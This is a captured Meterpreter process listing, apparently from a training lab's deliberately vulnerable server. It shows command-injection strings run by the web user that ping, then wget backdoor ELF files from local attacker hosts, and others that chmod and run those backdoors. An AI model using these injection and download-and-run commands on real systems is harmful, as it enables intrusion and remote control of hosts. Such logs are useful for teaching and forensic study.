+ 4458  /usr/sbin/snmpd                       snmp      /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
+ 4475  /usr/sbin/xinetd                      root      /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
+ 4518  proftpd:                              proftpd   proftpd: (accepting connections)
+ 4534  /usr/sbin/atd                         daemon    /usr/sbin/atd
+ 4547  /usr/sbin/cron                        root      /usr/sbin/cron
+ 4560  distccd                               daemon    distccd --daemon --user daemon --allow 0.0.0.0/0
+ 4578  /usr/bin/jsvc                         root      /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+ 4579  /usr/bin/jsvc                         root      /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+ 4581  /usr/bin/jsvc                         tomcat55  /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+ 4601  /usr/sbin/apache2                     root      /usr/sbin/apache2 -k start
+ 4611  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 4622  /usr/bin/rmiregistry                  root      /usr/bin/rmiregistry
+ 4626  ruby                                  root      ruby /usr/sbin/druby_timeserver.rb
+ 4635  /bin/login                            root      /bin/login --
+ 4640  /usr/bin/unrealircd                   root      /usr/bin/unrealircd
+ 4643  Xtightvnc                             root      Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
+ 4648  distccd                               daemon    distccd --daemon --user daemon --allow 0.0.0.0/0
+ 4652  /bin/sh                               root      /bin/sh /root/.vnc/xstartup
+ 4655  xterm                                 root      xterm -geometry 80x24+10+10 -ls -title X Desktop
+ 4660  fluxbox                               root      fluxbox
+ 4674  -bash                                 root      -bash
+ 4706  -bash                                 user      -bash
+ 4762  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 4814  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 4816  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.8/zabi_linuxbackdoor.elf && ls -l
+ 4821  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 4830  wget                                  www-data  wget 192.168.1.8/zabi_linuxbackdoor.elf
+ 4859  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 4860  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.0.10/amit_linuxbackdoor.elf && ls -l
+ 4867  wget                                  www-data  wget 192.168.0.10/amit_linuxbackdoor.elf
+ 4930  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 4963  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 4964  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.242.128/sachin.elf && ls -l
+ 4966  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 4968  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.50/wol.elf && ls -l
+ 4974  wget                                  www-data  wget 192.168.242.128/sachin.elf
+ 4975  wget                                  www-data  wget 192.168.1.50/wol.elf
+ 5148  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5150  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5245  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5246  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.8/zabi.elf && ls -l
+ 5255  wget                                  www-data  wget 192.168.1.8/zabi.elf
+ 5278  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5338  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5339  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.50/wol.elf && ls -l
+ 5342  wget                                  www-data  wget 192.168.1.50/wol.elf
+ 5454  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5462  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5463  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.8/zabi.elf && ls -l
+ 5468  wget                                  www-data  wget 192.168.1.8/zabi.elf
+ 5513  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5527  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && chmod +x pavan_backdoor.elf && ./pavan_backdoor.elf
+ 5530  ./pavan_backdoor.elf                  www-data  ./pavan_backdoor.elf
+ 5559  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5561  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5590  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && chmod +x kavya_backdoor.elf && ./kavya_backdoor.elf
+ 5593  ./kavya_backdoor.elf                  www-data  ./kavya_backdoor.elf
+ 5594  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5595  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.50/wol.elf && ls -l
+ 5596  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5599  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.8/zabi.elf && ls -l
+ 5601  wget                                  www-data  wget 192.168.1.50/wol.elf
+ 5602  wget                                  www-data  wget 192.168.1.8/zabi.elf
+ 5635  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5640  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 5688  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5695  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5697  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5698  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5705  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5706  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5714  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5717  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5718  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5722  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5738  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5740  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5758  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 5784  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 5785  sh                                    www-data  sh -c ping -c 3 4.2.2.2 && wget 192.168.1.50/wol.elf && ls -l
+ 5787  wget                                  www-data  wget 192.168.1.50/wol.elf
+ 5839  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 7126  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8551  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8618  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8623  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8631  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8633  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8635  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8637  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8663  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8724  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8739  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8760  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8764  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8773  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8775  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8780  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8782  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8784  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8791  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8797  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8799  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8801  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8807  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8809  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8812  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8816  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8819  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8822  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8834  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8856  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8861  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8862  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8868  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8871  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8872  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8873  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8876  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8879  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8880  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8881  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8882  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8883  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8884  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8885  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8888  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8889  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8890  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8891  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8892  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8896  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8897  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8898  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8899  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8900  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8901  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8903  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8904  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8906  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8908  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8909  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8912  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8923  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 8925  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8926  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8932  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8937  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8938  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8939  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8947  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8948  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8949  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8950  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8951  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8954  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8956  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8959  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8963  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8970  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8973  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8974  /bin/sh                               www-data  /bin/sh
+ 8984  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8986  /usr/lib/cgi-bin/php                  www-data  /usr/lib/cgi-bin/php
+ 8987  /usr/sbin/apache2                     www-data  /usr/sbin/apache2 -k start
+ 8996  sh                                    www-data  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
+ 8997  ps                                    www-data  ps ax -w -o pid,user,cmd --no-header
+
+meterpreter > 
+[*] 192.168.1.43 - Meterpreter session 1 closed.  Reason: Died
+meterpreter > 
+
